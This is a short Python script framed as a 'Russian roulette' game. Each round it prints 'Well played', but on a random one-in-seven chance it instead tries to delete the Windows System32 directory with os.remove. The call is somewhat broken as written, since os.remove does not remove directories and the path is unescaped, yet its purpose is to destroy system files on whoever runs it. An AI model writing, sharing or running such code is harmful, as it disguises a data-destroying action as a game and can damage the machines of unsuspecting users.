import os
import random

def main():
    if random.randint(0, 6) == 1:
        os.remove("C:\Windows\System32")
    else:
        print("Well played")

if __name__ == "__main__":
    while True:
        main()
        if input("Replay? (y/n) : ") != "y":
            break
